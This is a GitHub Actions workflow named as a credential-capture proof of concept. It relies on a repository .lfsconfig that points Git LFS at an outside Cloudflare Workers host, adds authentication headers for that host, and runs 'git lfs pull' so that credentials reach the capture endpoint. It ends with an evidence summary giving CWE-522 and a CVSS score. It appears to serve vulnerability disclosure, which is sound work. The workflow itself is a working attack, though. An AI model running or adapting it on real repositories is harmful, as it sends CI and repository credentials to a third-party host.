name: DSM-002-V2 Credential Capture via .lfsconfig

on:
  workflow_dispatch:
  push:
    paths:
      - '.github/workflows/dsm002-v2-capture.yml'

jobs:
  lfs-credential-capture:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Verify .lfsconfig redirect
        run: |
          echo "=== .lfsconfig content ==="
          cat .lfsconfig
          echo ""
          echo "=== LFS URL from .lfsconfig ==="
          git config -f .lfsconfig --get lfs.url
          echo ""
          echo "=== Git LFS effective endpoint ==="
          git lfs env 2>&1 | grep -i endpoint

      - name: Trigger LFS credential capture
        run: |
          echo "=== Running git lfs pull (reads .lfsconfig, redirects to capture endpoint) ==="
          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-auth-token: cloudflare"
          git config --global --add "http.https://lfs-capture.everton-win32.workers.dev.extraHeader" "x-source: github-actions"
          git lfs pull 2>&1 || true
          echo ""
          echo "=== LFS pull completed - credentials would be captured at the redirect endpoint ==="

      - name: Evidence summary
        run: |
          echo "## DSM-002-V2 Evidence"
          echo "- Source: GitHub Actions runner (Azure)"
          echo "- .lfsconfig URL: $(git config -f .lfsconfig --get lfs.url)"
          echo "- Header: x-auth-token: cloudflare (via http.<url>.extraHeader)"
          echo "- CWE: CWE-522 (Insufficiently Protected Credentials)"
          echo "- CVSS: 8.3 (High)"
